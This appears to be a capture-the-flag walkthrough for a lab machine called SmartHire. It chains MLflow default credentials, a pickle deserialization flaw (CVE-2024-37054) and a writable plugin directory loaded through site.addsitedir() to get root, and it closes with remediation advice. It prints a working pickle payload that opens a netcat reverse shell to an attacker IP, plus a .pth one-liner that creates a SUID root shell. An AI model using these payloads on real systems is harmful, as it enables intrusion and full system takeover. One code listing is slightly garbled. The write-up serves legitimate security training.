## Introduction

SmartHire is a Linux-based target that highlights the risks of exposing machine learning infrastructure and the dangers of insecure dynamic code loading in custom operational scripts. The machine demonstrates how default credentials and unpatched vulnerabilities in data science platforms like MLflow can lead to complete system compromise. Moving from initial access to root requires an understanding of insecure deserialization in Python and the often-overlooked internal mechanisms of Python's module search path configuration.

## Overview

The exploitation of SmartHire begins with standard web enumeration, revealing a hidden virtual host running an instance of MLflow. By leveraging default credentials found in older documentation, access is gained to the MLflow dashboard. The application is running a version vulnerable to CVE-2024-37054, allowing for Remote Code Execution (RCE) via the upload of a malicious Python pickle file containing a reverse shell payload.

After establishing a foothold as the svcweb user and stabilizing the shell via SSH, enumeration reveals a custom Python script intended for managing the MLflow service that can be run with sudo privileges without a password. The script utilizes Python's `site.addsitedir()` function to dynamically load plugins from a directory where the current user has write permissions. By dropping a malicious `.pth` file into this directory, arbitrary code is executed with root privileges during the Python interpreter's initialization phase, leading to full system compromise.

## Attack Chain

1. **Information Gathering:** Nmap and Gobuster reveal an exposed web server and a hidden virtual host (`models.smarthire.htb`).
2. **Authentication Bypass / Default Credentials:** The MLflow instance is secured with basic authentication, which is bypassed using default credentials (`admin:password`).
3. **Initial Access (CVE-2024-37054):** A dummy dataset is uploaded to trigger model training. The resulting legitimate machine learning model is overwritten via the MLflow API with a malicious serialized `.pkl` payload. Triggering a prediction deserializes the payload, yielding a reverse shell as `svcweb`.
4. **Persistence & Stabilization:** An SSH key is appended to the `svcweb` user's authorized_keys file to establish a stable, interactive session.
5. **Privilege Escalation:** A sudo misconfiguration allows the execution of `mlflowctl.py`. The script insecurely parses a writable plugin directory using the site module. A malicious .pth file is crafted to hijack the execution flow, copying `/bin/bash` to `/tmp` with the SUID bit set, granting root access.

The backend application will eventually deserialize the python_model.pkl file when making a prediction. Since Python's pickle library is vulnerable to arbitrary code execution upon deserialization, we can craft a malicious pickle file containing a reverse shell.

In Python, the pickle library is designed to serialize and deserialize complex object structures into byte streams. When the pickle engine encounters a custom class, it looks for the magic method named **reduce** to understand how to reconstruct that object later.

The **reduce** method is expected to return a tuple containing two items: a callable function, and a tuple of arguments to pass to that function. The critical security flaw arises during the deserialization phase. When the target application receives the malicious pickle file and attempts to load it, the pickle engine blindly executes the callable function with the provided arguments in order to rebuild the object in memory.

By crafting a **reduce** method that returns the os.system function alongside a reverse shell command as its argument, the attacker hijacks this reconstruction process. The target server executes the operating system command immediately upon deserialization, granting remote code execution before the underlying application logic even has a chance to inspect or validate the loaded data.

So, create a script named `generate_payload.py` on your attacking machine:
```
import os
import pickle

class MaliciousModel(object):
    def __reduce__(self):
        # Replace YOUR_IP with your actual tun0 IP address
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 4444 >/tmp/f"
        return (os.system, (cmd,))

malicious_data = pickle.dumps(MaliciousModel())

with open("python_model.pkl", "wb") as f:
    f.write(malicious_data)

print("Malicious python_model.pkl generated successfully.")
```

The script `/opt/tools/mlflow_ctl/mlflowctl.py` contains the following code:
```
#!/usr/bin/env python3                                                                                                         
"""                                                                                                                            
MLFLOW-CTL: Operational interface for managing the MLflow service.                                                             
Supports a pluggable extension model for environment-specific logic.                                                           
For changes or plugin requests, please contact the Platform Team.                                                              
"""                                                                                                                            
                                                                                                                               
from pathlib import Path                                                                                                       
import sys                                                                                                                     
import site                                                                                                                    
                                                                                                                               
BASE_DIR = Path(__file__).resolve().parent                                                                                     
PLUGINS_DIR = BASE_DIR / "plugins"                                                                                             

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]") 
    sys.exit(1)plugins

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
       print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...") 
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": main()
```

Reviewing the source code of the script reveals a critical vulnerability rooted in its dynamic plugin loading architecture. The script begins with standard imports like `sys` for argument parsing and `pathlib` for file system operations, alongside a highly unusual addition::
```
from pathlib import Path
import sys
import site
```

While `sys` and `pathlib` are expected, the `site` module is typically reserved for Python's internal startup sequence to configure the module search path (`sys.path`). Invoking it manually within an operational script greatly expands the attack surface. The danger of this design choice becomes apparent a few lines later where the script actually implements the plugin system:
```
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

In this block, the script resolves the absolute path to a `plugins` directory and systematically iterates through every subdirectory it contains. During this loop, it passes each directory path directly to the `site.addsitedir()` function. This specific implementation is deeply flawed because it creates a direct execution vector. By blindly feeding directories into a path configuration function, the script opens the door for path manipulation; if an attacker has write permissions to any of the subdirectories being processed by this loop, they can leverage the `site` module's internal mechanisms to execute arbitrary code.

To weaponize this dynamic loading flaw, we must understand exactly how the `site.addsitedir()` function behaves. According to Python's official documentation, when this function processes a directory, it looks for Path Configuration Files—any file ending with the `.pth` extension.

While `.pth` files are typically used to append additional directories to the Python search path, they harbor a dangerous secondary feature: **if a line in a `.pth` file begins with the word `import`, the site module immediately executes that line using Python's `exec()` function.**

Because the `svcweb` user belongs to the `devs` group, which has write access to the `/opt/tools/mlflow_ctl/plugins/dev` directory, all the conditions for privilege escalation are met. We do not need to hijack an existing module or wait for the main script's logic to trigger; the code execution will occur dynamically during the plugin loading loop.

We navigate to the writable plugin directory and craft a malicious `.pth` file. In this example, we will write a Python one-liner that copies the `/bin/bash` binary to `/tmp` and sets the SUID bit, allowing us to drop into a root shell trivially.

```
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' > exploit.pth
```

> **Note:** Alternatively, a standard Python reverse shell payload can be embedded here.


With the payload in place, we simply execute the `mlflowctl.py` script using our passwordless `sudo` privilege. The argument provided (`status`, `restart`, or even a random string) is irrelevant, because our malicious `.pth` file is evaluated during the environment setup phase, bypassing the script's intended argument validation entirely:
```
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

As the script iterates through the plugins, `site.addsitedir()` parses `exploit.pth`, reads the `import os...` statement, and executes our system command as `root`.

We can verify the execution by checking for our SUID binary and executing it with the `-p` flag (to preserve privileges) to obtain the root shell:
```
/tmp/rootbash -p
```

## Remediation & Recommendations

To secure the SmartHire environment, the following remediations should be implemented:

- **Change Default Credentials:** The MLflow instance is currently using easily guessable default credentials. Immediate action must be taken to change the admin password to a strong, complex passphrase.
- **Update and Patch MLflow:** The server is running MLflow version `2.14.1`, which is vulnerable to `CVE-2024-37054`. The software should be updated to the latest stable release to patch known insecure deserialization vulnerabilities.
- **Sanitize Machine Learning Models:** Avoid loading untrusted serialized data (like Python `.pkl` files) directly into the environment. Transition to safer serialization formats such as safetensors or ONNX, which do not inherently support arbitrary code execution during deserialization.
- **Restrict File Permissions:** The `svcweb` user (and the devs group) should not have write access to operational script directories, specifically `/opt/tools/mlflow_ctl/plugins/dev`. Enforce the Principle of Least Privilege by restricting write access to root or a dedicated deployment account.
- **Secure Python Scripting:** The `mlflowctl.py` script must be refactored. The use of `site.addsitedir()` on user-writable directories is a severe security risk. If a plugin architecture is required, utilize Python's importlib for controlled module loading, and implement strict validation (such as checking file ownership and permissions) before loading any external code.
